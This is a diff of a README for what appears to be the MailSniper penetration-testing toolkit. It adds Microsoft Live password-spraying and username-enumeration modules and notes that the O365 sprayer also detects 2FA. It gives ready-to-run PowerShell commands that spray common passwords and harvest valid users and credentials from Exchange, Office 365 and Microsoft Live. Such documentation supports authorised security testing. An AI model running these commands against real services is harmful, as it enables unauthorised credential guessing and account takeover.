@@ -85,7 +85,11 @@ Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -
 ```PowerShell
 Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile sprayed-ews-creds.txt
 ```
-**Invoke-PasswordSprayO365** is a module that can take a username/list of usernames and a password/list of passwords and attempt to login to the online Office 365 portal. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!
+**Invoke-PasswordSprayMicrosoftLive** is a module that takes a username/list of usernames and a password/list of passwords and attempt to login to the Microsoft Live portal.
+```PowerShell
+Invoke-PasswordSprayMicrosoftLive -EmailList .\emails.txt -Password Spring2018 -Threads 5 -OutFile creds.txt
+```
+**Invoke-PasswordSprayO365** is a module that can take a username/list of usernames and a password/list of passwords and attempt to login to the online Office 365 portal. Also enumerates 2FA implemented, if any. PLEASE BE CAREFUL NOT TO LOCKOUT ACCOUNTS!
 ```PowerShell
 Invoke-PasswordSprayO365 -EmailList .\emails.txt -Password Spring2018 -Threads 5 -OutFile creds.txt
 ```
@@ -97,9 +101,9 @@ Invoke-DomainHarvestOWA -ExchHostname mail.domain.com
 ```PowerShell
 Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Threads 1 -OutFile owa-valid-users.txt
 ```
-**Invoke-UsernameHarvestO365** is a module that will attempt to connect to Microsoft's Office 365 Login Portal and enumerate any users that exists based off a passed email or list of emails (one per line).
+**Invoke-UsernameHarvestMicrosoftLive** is a module that will enumerate users from the Microsoft Live website that exist based off a passed email or list of emails (one per line).
 ```PowerShell
-Invoke-UsernameHarvestO365 -EmailList .\emails.txt -OutFile successful.txt
+Invoke-UsernameHarvestMicrosoftLive -EmailList .\emails.txt -OutFile successful.txt
 ```
 
 **Invoke-OpenInboxFinder** is a module that will attempt to determine if the current user running MailSniper has access to the Inbox of each email address in a list of addresses.
